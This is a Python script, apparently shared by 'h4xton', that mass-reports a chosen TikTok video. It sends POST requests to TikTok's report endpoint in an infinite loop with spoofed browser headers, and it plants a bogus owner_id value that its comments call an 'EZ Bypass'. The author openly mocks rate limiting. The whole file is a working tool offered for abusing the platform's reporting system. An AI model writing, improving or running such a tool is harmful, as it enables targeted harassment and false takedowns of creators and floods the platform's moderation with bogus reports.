"""


 /$$   /$$ /$$   /$$             /$$                        
| $$  | $$| $$  | $$            | $$                        
| $$  | $$| $$  | $$ /$$   /$$ /$$$$$$    /$$$$$$  /$$$$$$$ 
| $$$$$$$$| $$$$$$$$|  $$ /$$/|_  $$_/   /$$__  $$| $$__  $$
| $$__  $$|_____  $$ \  $$$$/   | $$    | $$  \ $$| $$  \ $$
| $$  | $$      | $$  >$$  $$   | $$ /$$| $$  | $$| $$  | $$
| $$  | $$      | $$ /$$/\  $$  |  $$$$/|  $$$$$$/| $$  | $$
|__/  |__/      |__/|__/  \__/   \___/   \______/ |__/  |__/
                                                            
                                                            
                                                            



"""

import requests,os,sys,time,threading,json,random



class TikTok():
    def __init__(self):
        self.credit = "https://github.com/h4xton"#Spoof Device ID Down Below ;)

    def sendreport(self,videoid,videolink):
        url = "https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&region=DK&priority_region=&os=windows&referer=&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=en-US&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F94.0.4606.71+Safari%2F537.36&browser_online=true&app_language=en&timezone_name=Europe%2FCopenhagen&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=3&battery_info=%7B%7D"
        payload = json.dumps({
                "reason": 106,
                "object_id": videoid,
                "owner_id": "success", ##EZ Bypass
                "report_type": "video"
                })
        headers = {
                'authority': 'www.tiktok.com',
                'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
                'content-type': 'application/json',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://www.tiktok.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': videolink,
                'accept-language': 'en-US,en;q=0.9'
                }#
        while True:
                   response = requests.request("POST", url, headers=headers, data=payload)
                   receiveresponse = response.json()['errMsg']
                   print("(TIKTOK) Succesfully Report Video: " + videoid + ' #' + receiveresponse) #Thoughs about adding rate-limit system? Cringe LUL



if __name__ == "__main__":
    videoid = input("Video ID >")
    videolink = input("Video Link >")
    while True: TikTok.sendreport(0,videoid,videolink)
